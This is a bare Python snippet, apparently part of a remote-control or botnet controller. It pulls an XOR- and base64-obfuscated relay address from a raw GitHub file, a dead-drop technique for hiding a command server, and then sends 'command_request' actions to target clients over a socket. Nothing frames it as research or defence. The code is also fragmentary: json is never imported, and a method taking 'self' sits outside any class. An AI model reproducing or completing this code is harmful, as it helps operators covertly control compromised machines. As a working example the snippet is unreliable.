import base64
import urllib.request

KEY = b"mysecretkey"
URL = "https://raw.githubusercontent.com/USER/REPO/main/relay.txt"

def xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def get_relay_address():
    encrypted = urllib.request.urlopen(URL, timeout=5).read().strip()
    decoded = base64.b64decode(encrypted)
    return xor(decoded, KEY).decode()

relay = get_relay_address()
host, port = relay.split(":")
port = int(port)

print("[INFO] Relay =", host, port)

def send_command(self, client_id, action):
    msg = {
        "type": "command_request",
        "target": client_id,
        "action": action
    }
    self.sock.sendall((json.dumps(msg) + "\n").encode())
